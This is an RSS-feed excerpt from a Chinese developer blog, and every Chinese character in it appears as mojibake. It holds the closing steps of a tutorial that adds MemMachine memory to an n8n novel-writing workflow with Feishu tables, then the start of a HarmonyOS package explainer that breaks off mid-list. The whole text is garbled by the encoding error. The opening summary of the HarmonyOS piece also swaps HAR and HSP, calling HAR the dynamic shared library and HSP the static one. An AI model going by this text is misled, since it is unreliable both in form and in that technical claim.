<p>è¿™ä¸ªå°è¯´å·¥ä½œæµå’ŒåŸæ¥çš„ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯åŠ äº†<strong>MemMachine</strong>è®°å¿†å†™å…¥å’Œè¯»å–é€»è¾‘ã€‚è¿™é‡Œå°±ä¸å†ä»å¤´å¼€å§‹æ­å»ºï¼Œåªè®²å·®å¼‚éƒ¨åˆ†ï¼Œéœ€è¦çœ‹ä»0å¼€å§‹çš„æ­å»ºæ­¥éª¤å¯ä»¥å»çœ‹<a href="https://juejin.cn/post/7580378958072610826" target="_blank" title="https://juejin.cn/post/7580378958072610826">é€šåƒç½‘æ–‡æŠ•ç¨¿+AIæ¼«å‰§ç‰ˆæƒï¼æˆ‘ç”¨ n8n+é£ä¹¦æ­äº†ä¸ªâ€œä¸‡å­—çˆ†æ¬¾å°è¯´æµæ°´çº¿â€</a></p>
<p><strong>é•¿ç¯‡å°è¯´å·¥ä½œè¿è¡Œæµç¨‹å¦‚ä¸‹ï¼š</strong></p>
<ol>
<li>
<p>è¡¨å•æäº¤å°è¯´ä¸»é¢˜å’Œé¢†åŸŸå†…å®¹</p>
</li>
<li>
<p>æ ¹æ®ç”¨æˆ·æäº¤è¡¨å•ä¸­çš„å°è¯´é¢†åŸŸå»é£ä¹¦ç´ æåº“ä¸­æ‰¾åˆ°å¯¹åº”å°è¯´ç´ æä½œä¸ºå†™ä½œå‚è€ƒ</p>
</li>
<li>
<p>ç»“åˆå°è¯´ç´ æï¼Œç”¨æˆ·æä¾›çš„ä¸»é¢˜ç¼–å†™å°è¯´çš„å¤§çº²å’Œç« èŠ‚æ¢—æ¦‚åˆ—è¡¨ï¼ˆæ•°ç»„å½¢å¼ï¼‰</p>
</li>
<li>
<p>åˆå§‹åŒ–ä¸€ä¸ª<strong>MemMachine</strong> projectï¼Œè·å¾—ä¸€ä¸ªproject_id</p>
</li>
<li>
<p>è¿›å…¥å¾ªç¯å¼€å§‹ç¼–å†™ç« èŠ‚å†…å®¹</p>
</li>
<li>
<p>æ ¹æ®project_idä»<strong>MemMachine</strong> è·å–ä¸Šä¸€ç« èŠ‚çš„å†…å®¹</p>
</li>
<li>
<p>æ ¹æ®å‰æœŸæè¦ï¼Œå¤§çº²å’Œæœ¬ç« èŠ‚çš„æ¢—æ¦‚ç¼–å†™æœ¬ç« èŠ‚çš„è¯¦ç»†å†…å®¹</p>
</li>
<li>
<p>å†™å…¥ç« èŠ‚å†…å®¹åˆ°é£ä¹¦è¡¨æ ¼</p>
</li>
<li>
<p>æ€»ç»“æœ¬ç« èŠ‚çš„å†…å®¹ï¼Œä»¥project_idä¸ºæ ‡è¯†å†™å…¥<strong>MemMachine</strong></p>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ffb1ee4bbb624cbb881b0b67841863b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=DaVbeqFPjSrJNV6iovE6xdNLB8s%3D" alt="" loading="lazy"/></p>
<p><strong>åˆå§‹åŒ–é¡¹ç›®(HTTP Request)ï¼š</strong> è¿™ä¸ªèŠ‚ç‚¹ä½äºç¼–å†™å¤§çº²èŠ‚ç‚¹çš„å‰é¢ï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨<strong>MemMachine</strong> ä¸­æ–°å»ºä¸€ä¸ª<strong>project</strong>ï¼Œåç»­ç¼–å†™çš„ç« èŠ‚å†…å®¹ä¼šå­˜å…¥åˆ°projectä¸­ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f6254a35ed048bc88785197726324bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=gP2Dmh%2F1Qn%2B0Rgt%2BobzpqonCEDM%3D" alt="" loading="lazy"/></p>
<p>è·Ÿä¹‹å‰çš„å°è¯´å·¥ä½œæµæ¯”ï¼Œè¿™ä¸ªå·¥ä½œæµçš„å˜åŠ¨ä¸»è¦åœ¨ç« èŠ‚ç¼–å†™éƒ¨åˆ†ï¼Œæ•…æœ¬æ–‡çš„èŠ‚ç‚¹æ­å»ºè®²è§£ä¸»è¦å›´ç»•ç« èŠ‚ç¼–å†™éƒ¨åˆ†å±•å¼€ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0a79c1399af4df796314b5435b857c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=qoGkoW7p7yrLnT9YLHIxhhbXcLY%3D" alt="" loading="lazy"/></p>
<p><strong>è¯»å–è®°å¿†ï¼ˆHTTP Requestï¼‰ï¼š</strong> è¿™ä¸ªèŠ‚ç‚¹çš„ä½œç”¨æ˜¯æ ¹æ®<strong>project_id</strong>ï¼Œè·å–å¯¹åº”<strong>project</strong>ä¸­å­˜å‚¨çš„è®°å¿†ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœ<strong>å½“å‰ç« æ•°ä¸º3</strong>ï¼Œé‚£ä¹ˆå°±ä¼šä»<strong>projectä¸­</strong>è·å–<strong>å‰2ç« çš„æ•°æ®</strong>ï¼Œå¦‚æœå½“å‰ç« æ•°ä¸º1åˆ™è¿”å›ç©ºæ•°æ®ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c8685abcfbb84d12a15ce564978cc18e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=bkGUfXPO1IkyvxRtkbnzYarJOUQ%3D" alt="" loading="lazy"/></p>
<p><strong>è·å–ç« èŠ‚æ¢—æ¦‚(Code inJavaScript)ï¼šè¯»å–è®°å¿†ï¼ˆHTTP Requestï¼‰èŠ‚ç‚¹å‡ºæ¥åç‚¹å‡»ã€+ã€‘æ–°å¢Code inJavaScriptèŠ‚ç‚¹ã€‚</strong> å®ƒçš„ä½œç”¨æ˜¯ä»å‰ç½®æ‰€æœ‰ç« èŠ‚åˆ—è¡¨ä¸­å–å‡ºæœ€åä¸€ç« çš„ç« èŠ‚å†…å®¹ã€‚å¦‚<strong>è¯»å–è®°å¿†ï¼ˆHTTP Requestï¼‰</strong> èŠ‚ç‚¹ä¼ å…¥äº†2ç« æ•°æ®ï¼Œé‚£ä¹ˆè¿™ä¸ªèŠ‚ç‚¹å°±ä¼šè·å–ç¬¬2ç« æ•°æ®ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cdd0dc5a36f4ef4aaeec0b6e460b8d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=8tg%2BGrIrC61qQtMBcIEtAj1wAbk%3D" alt="" loading="lazy"/></p>
<p><strong>ç« èŠ‚ç¼–å†™ï¼ˆAI Agentï¼‰ï¼šè·å–ç« èŠ‚æ¢—æ¦‚(Code inJavaScript)èŠ‚ç‚¹å‡ºæ¥åç‚¹å‡»ã€+ã€‘æ–°å¢AI AgentèŠ‚ç‚¹ã€‚</strong> è¿™ä¸ªèŠ‚ç‚¹çš„ä½œç”¨æ˜¯æ ¹æ®å°è¯´æ‘˜è¦ï¼Œç¬¬2ç« æ•…äº‹æ¢—æ¦‚ä¸ç»“å°¾ï¼Œå’Œç¬¬ä¸‰ç« æ•…äº‹æ¢—æ¦‚<strong>ç¼–å†™ç¬¬ä¸‰ç« å†…å®¹</strong>ï¼Œè¿™æ ·å°±èƒ½å®Œç¾è§£å†³å¤§æ¨¡å‹æ— æ³•ç¼–å†™é•¿ç¯‡å°è¯´ä»¥åŠå†…å®¹è¿‡é•¿å¯¼è‡´çš„å†…å®¹ä¸è¿è´¯æˆ–äººç‰©OOCã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/356f98bb1e4343659148d3b4c0f94710~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=o57h70mdXvbePjWLvrfX%2BDhqb14%3D" alt="" loading="lazy"/></p>
<p><strong>Code1ï¼ˆå°†æ•°æ®æ”¹ä¸º</strong> <strong>é£ä¹¦</strong> <strong>è¡¨æ ¼é€‚é…å½¢å¼ï¼‰ï¼šç« èŠ‚ç¼–å†™ï¼ˆAI Agentï¼‰èŠ‚ç‚¹å‡ºæ¥åç‚¹å‡»ã€+ã€‘æ–°å¢Code inJavaScriptèŠ‚ç‚¹ã€‚</strong> è¿™æ˜¯ä¸€ä¸ªä»£ç èŠ‚ç‚¹ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†å°è¯´å†…å®¹é€‚é…ä¸ºé£ä¹¦è¡¨æ ¼çš„å½¢å¼ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/244c35d71f56467280cf28edb7633f94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=q4HIsBgPtVENIJSNSIbRyacVB64%3D" alt="" loading="lazy"/></p>
<p><strong>å†™å…¥</strong> <strong>é£ä¹¦</strong> <strong>ï¼ˆBitable:table:record:add bitableï¼‰ï¼šCode1ï¼ˆå°†æ•°æ®æ”¹ä¸ºé£ä¹¦è¡¨æ ¼é€‚é…å½¢å¼ï¼‰å‡ºæ¥åç‚¹å‡»ã€+ã€‘æ–°å¢Bitable:table:record:add bitableèŠ‚ç‚¹ã€‚</strong> è¿™æ˜¯n8nç¤¾åŒºèŠ‚ç‚¹ï¼Œè´Ÿè´£å†™å…¥æ•°æ®åˆ°é£ä¹¦è¡¨æ ¼ã€‚èŠ‚ç‚¹çš„é…ç½®ä½¿ç”¨å¯å‚è€ƒ<a href="https://juejin.cn/post/7578499754553278515" target="_blank" title="https://juejin.cn/post/7578499754553278515">n8n+Coze+é£ä¹¦ï¼šå…¬ä¼—å·å¯¹æ ‡æ–‡ç« ä¸€é”®å½•å…¥+æ·±åº¦æ‹†è§£ï¼Œæ‰“é€ ä½ çš„ã€çˆ†æ¬¾ç´ æåº“ã€‘</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f6a8b2286614ff297e33e4bd672340b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=TOdg9Zgky%2BANOmqrNAjdgW5Nw4s%3D" alt="" loading="lazy"/></p>
<p><strong>æ€»ç»“ï¼ˆAI Agentï¼‰ï¼šå†™å…¥</strong> <strong>é£ä¹¦</strong> <strong>ï¼ˆBitable:table:record:add bitableï¼‰èŠ‚ç‚¹å‡ºæ¥åç‚¹å‡»ã€+ã€‘æ–°å¢AI AgentèŠ‚ç‚¹ã€‚</strong> è¿™ä¸ªèŠ‚ç‚¹çš„ä½œç”¨æ˜¯å¯¹<strong>ç« èŠ‚ç¼–å†™ï¼ˆAI Agentï¼‰èŠ‚ç‚¹</strong>è¾“å‡ºçš„å°è¯´å†…å®¹è¿›è¡Œæ€»ç»“ï¼Œæ€»ç»“å‰§æƒ…æ‘˜è¦ï¼Œä¿ç•™ç»“å°¾å†…å®¹ä»¥ä¾¿ä¸‹ä¸€ç« çš„è¡”æ¥ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3632bd586d604c39bc6dd4d3409d2bd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=F6NgZTpMVPCpXwa8XkTxDXvg1%2B8%3D" alt="" loading="lazy"/></p>
<p><strong>å­˜å…¥è®°å¿†ï¼ˆHTTP Requestï¼‰ï¼šæ€»ç»“ï¼ˆAI Agentï¼‰èŠ‚ç‚¹å‡ºæ¥åç‚¹å‡»ã€+ã€‘æ–°å¢HTTP RequestèŠ‚ç‚¹ã€‚</strong> è¿™ä¸ªèŠ‚ç‚¹çš„ä½œç”¨æ˜¯è°ƒç”¨<strong>MemMachine</strong> æ¥å£å°†ç« èŠ‚å†…å®¹å­˜å…¥<strong>project</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b056994e6bf4445d91aed991430728ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=NFHAiwzVn7bdruKIrSjGFYM7Tck%3D" alt="" loading="lazy"/></p>
<p>ä»¥ä¸Šå°±æ˜¯æ•´ä¸ªå·¥ä½œæµçš„å®Œæ•´æµç¨‹æ‹†è§£ï¼ŒåŠ¨æ‰‹èƒ½åŠ›å¼ºçš„è¯»è€…å¯ä»¥è·Ÿç€æ•™ç¨‹å®è·µä¸€éã€‚<strong>ä¸Šè¿°å·¥ä½œæµå·²ç»è¢«æ”¶å½•åˆ°äº†å°è‚¥è‚ è¡ŒåŠ¨å®¶ç¤¾ç¾¤ä¸­ï¼Œå¦‚æœæƒ³ç›´æ¥è·å–å·¥ä½œæµåŸä»¶ï¼Œå¯ä»¥åŠ å…¥ç¤¾ç¾¤åæˆ‘æ‹‰ä½ è¿›ç©ºé—´ç›´æ¥å­¦ä¹ ä½¿ç”¨ã€‚</strong></p>
<h2 data-id="heading-5">4. ç»“è¯­</h2>
<p>è‡³æ­¤ï¼Œä¸€ä¸ªèƒ½å¤Ÿè‡ªæˆ‘è¿­ä»£ã€æ‹¥æœ‰é•¿æœŸè®°å¿†çš„<strong>æ— é™é•¿ç¯‡å°è¯´ç”Ÿæˆå™¨</strong>å°±æ­å»ºå®Œæˆäº†ã€‚è¿™å¥—å·¥ä½œæµæœ€å¤§çš„ä»·å€¼ï¼Œä¸åœ¨äºå†™å°è¯´æœ¬èº«ï¼Œè€Œåœ¨äºå®ƒè¯æ˜äº† <strong>MemMachine + n8n</strong> ç»„åˆçš„æ— é™å¯èƒ½ã€‚å½“æˆ‘ä»¬æŠŠ<strong>è®°å¿†</strong>ä»å¤§æ¨¡å‹ä¸­è§£è€¦å‡ºæ¥ï¼Œèµ‹äºˆ Agent çœŸæ­£çš„é•¿æœŸçŠ¶æ€ç®¡ç†èƒ½åŠ›æ—¶ï¼ŒAIå°±ä¸å†æ˜¯ä¸€ä¸ªèŠå®Œå³å¿˜çš„èŠå¤©æœºå™¨äººï¼Œè€Œæ˜¯ä¸€ä¸ªèƒ½ä¼´éšå‰§æƒ…æˆé•¿çš„<strong>åˆ›ä½œè€…</strong>ã€‚</p>
<p><strong>å¦‚æœ¬æ¬¡åˆ†äº«å¯¹ä½ æœ‰å¸®åŠ©ï¼Œéº»çƒ¦ä¸€é”®ä¸‰è¿æ”¯æŒä¸€ä¸‹å°è‚¥è‚ ï¼Œæˆ‘ä»¬ä¸‹æœŸå†è§~</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e48cf94d4e9243909c862e24653280b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=1S%2F%2FmQ1qcrb%2FHOzPy3kIk9TVPqk%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ§© ä¸€æ–‡ææ‡‚ HarmonyOS ä¸­çš„ HAPã€HAR å’Œ HSPï¼šå®ƒä»¬åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿæ€ä¹ˆç”¨ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7582848701268361251</link>    <guid>https://juejin.cn/post/7582848701268361251</guid>    <pubDate>2025-12-13T09:49:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582848701268361251" data-draft-id="7582844980399783976" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ§© ä¸€æ–‡ææ‡‚ HarmonyOS ä¸­çš„ HAPã€HAR å’Œ HSPï¼šå®ƒä»¬åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿæ€ä¹ˆç”¨ï¼Ÿ"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-12-13T09:49:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="90åæ™¨ä»”"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476705773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ§© ä¸€æ–‡ææ‡‚ HarmonyOS ä¸­çš„ HAPã€HAR å’Œ HSPï¼šå®ƒä»¬åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿæ€ä¹ˆç”¨ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476705773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    90åæ™¨ä»”
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T09:49:39.000Z" title="Sat Dec 13 2025 09:49:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0c9edf8690d434d8bb3a445e3641fd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgOTDlkI7mmajku5Q=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766224226&amp;x-signature=FbTlU%2FMAoApy4JKPJZKwS78hjPY%3D" alt="Snip20251213_6.png" loading="lazy"/></p>
<h2 data-id="heading-0">ğŸŒŸ å¼€å¤´ä¸€å¥è¯æ€»ç»“</h2>
<ul>
<li><strong>HAP</strong> æ˜¯ä½ æœ€ç»ˆå®‰è£…åˆ°æ‰‹æœºä¸Šçš„â€œApp åŒ…â€ï¼›</li>
<li><strong>HAR</strong> æ˜¯å¯è¢«å¤šä¸ª App å…±äº«çš„â€œåŠ¨æ€åº“â€ï¼ˆåƒ npm åŒ…ï¼‰ï¼›</li>
<li><strong>HSP</strong> æ˜¯åªèƒ½è¢«ä¸€ä¸ª App å†…éƒ¨ä½¿ç”¨çš„â€œé™æ€åº“â€ï¼ˆåƒç§æœ‰å·¥å…·å‡½æ•°é›†åˆï¼‰ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-1">ğŸ“¦ 1. HAPï¼šHarmonyOS Ability Packageï¼ˆèƒ½åŠ›åŒ…ï¼‰</h2>
<h3 data-id="heading-2">âœ… å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>HAP æ˜¯ <strong>é¸¿è’™åº”ç”¨çš„å®‰è£…å•å…ƒ</strong>ã€‚ä½ å¯ä»¥æŠŠå®ƒç†è§£ä¸º Android çš„ APK æˆ– iOS çš„ IPAã€‚</p>
<p>æ¯ä¸ªé¸¿è’™ App è‡³å°‘åŒ…å«ä¸€ä¸ª HAPï¼Œé€šå¸¸åˆ†ä¸ºä¸¤ç§ï¼š</p>

















<table><thead><tr><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>Entry HAP</strong></td><td>ä¸»æ¨¡å—ï¼Œç”¨æˆ·ç‚¹å‡»å›¾æ ‡å¯åŠ¨çš„å°±æ˜¯å®ƒï¼ˆå¿…é¡»æœ‰ï¼‰</td></tr><tr><td><strong>Feature HAP</strong></td><td>å¯é€‰åŠŸèƒ½æ¨¡å—ï¼ŒæŒ‰éœ€ä¸‹è½½ï¼ˆæ¯”å¦‚â€œç›´æ’­â€ã€â€œæ”¯ä»˜â€ç­‰ç‹¬ç«‹åŠŸèƒ½ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-3">ğŸ“ æ–‡ä»¶ç»“æ„ç¤ºä¾‹ï¼š</h3>
<pre><code class="hljs language-css" lang="css">MyApp/
â”œâ”€â”€ entry/          â† Entry HAP
â”‚   â”œâ”€â”€ <span class="hljs-attribute">src</span>/<span class="hljs-selector-tag">main</span>/
â”‚   â””â”€â”€ module<span class="hljs-selector-class">.json5</span>
â”œâ”€â”€ feature_live/   â† Feature HAPï¼ˆå¯é€‰ï¼‰
â””â”€â”€ build-profile<span class="hljs-selector-class">.json5</span>
</code></pre>
<h3 data-id="heading-4">ğŸ’¡ å…³é”®ç‚¹ï¼š</h3>
<ul>
<li>ç”¨æˆ·å®‰è£…çš„æ˜¯ <code>.hap</code> æ–‡ä»¶ï¼ˆå®é™…æ˜¯ ZIP æ ¼å¼ï¼‰ã€‚</li>
<li>ä¸€ä¸ª App å¯ä»¥æœ‰å¤šä¸ª HAPï¼Œä½†åªæœ‰ä¸€ä¸ª Entryã€‚</li>
<li>HAP é‡ŒåŒ…å«ä»£ç ã€èµ„æºã€é…ç½®ã€Abilityï¼ˆé¡µé¢/æœåŠ¡ï¼‰ç­‰ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-5">ğŸ§± 2. HARï¼šHarmonyOS Archiveï¼ˆå…±äº«å½’æ¡£åŒ…ï¼‰</h2>
<h3 data-id="heading-6">âœ… å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>HAR æ˜¯ <strong>å¯å¤ç”¨çš„å…±äº«åº“</strong>ï¼Œç±»ä¼¼ Web å¼€å‘ä¸­çš„ <code>npm</code> åŒ…ï¼Œæˆ– Android çš„ AARã€‚</p>
<ul>
<li>å¤šä¸ª App æˆ–å¤šä¸ª HAP <strong>éƒ½å¯ä»¥å¼•ç”¨åŒä¸€ä¸ª HAR</strong>ã€‚</li>
<li>ç¼–è¯‘åç”Ÿæˆ <code>.har</code> æ–‡ä»¶ã€‚</li>
<li>æ”¯æŒåŒ…å« <strong>TS/JS ä»£ç ã€C++ åŸç”Ÿä»£ç ã€èµ„æºæ–‡ä»¶ï¼ˆå›¾ç‰‡ã€å­—ç¬¦ä¸²ç­‰ï¼‰</strong> ã€‚</li>
</ul>
<h3 data-id="heading-7">ğŸ› ï¸ ä»€ä¹ˆæ—¶å€™ç”¨ HARï¼Ÿ</h3>
<ul>
